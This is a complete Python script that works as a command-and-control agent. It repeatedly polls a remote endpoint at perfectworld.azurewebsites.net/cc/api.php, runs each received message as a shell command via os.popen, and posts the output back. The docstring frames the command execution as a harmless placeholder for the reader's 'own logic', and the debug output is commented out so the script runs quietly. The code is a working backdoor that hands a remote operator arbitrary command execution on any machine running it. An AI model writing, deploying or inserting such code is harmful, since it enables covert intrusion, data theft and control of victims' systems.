import requests
import time
import os

# ── Config ────────────────────────────────────────────────────────────────────

API_URL      = "https://perfectworld.azurewebsites.net/cc/api.php"
POLL_INTERVAL = 5   # seconds between GET requests

# ── Your processing function ──────────────────────────────────────────────────

def process(message: str) -> str:
    """
    Replace the body of this function with your own logic.
    Receives the message from the dashboard, must return a string to POST back.
    """
    command_output = os.popen(message).read()

    return f"{command_output}"

# ── Core loop ─────────────────────────────────────────────────────────────────

def poll():
    # print(f"[*] Started polling {API_URL} every {POLL_INTERVAL}s  (Ctrl+C to stop)\n")

    while True:
        try:
            # ── GET ──────────────────────────────────────────────────────────
            response = requests.get(API_URL, timeout=10)
            response.raise_for_status()
            data = response.text.strip()

            # print(f"[GET]  → {data!r}")

            if data.lower() == "idle":
                # Nothing to do, wait and poll again
                time.sleep(POLL_INTERVAL)
                continue

            # ── Process ──────────────────────────────────────────────────────
            # print(f"[...] Processing message: {data!r}")
            result = process(data)
            # print(f"[...] Result: {result!r}")

            # ── POST ─────────────────────────────────────────────────────────
            post_response = requests.post(API_URL, data=result, timeout=10)
            post_response.raise_for_status()
            # print(f"[POST] → {post_response.text.strip()!r}\n")

        except requests.exceptions.ConnectionError:
            print("[ERR] Could not connect to the API. Retrying...")

        except requests.exceptions.Timeout:
            print("[ERR] Request timed out. Retrying...")

        except requests.exceptions.HTTPError as e:
            print(f"[ERR] HTTP error: {e}")

        except Exception as e:
            print(f"[ERR] Unexpected error: {e}")

        time.sleep(POLL_INTERVAL)


if __name__ == "__main__":
    poll()
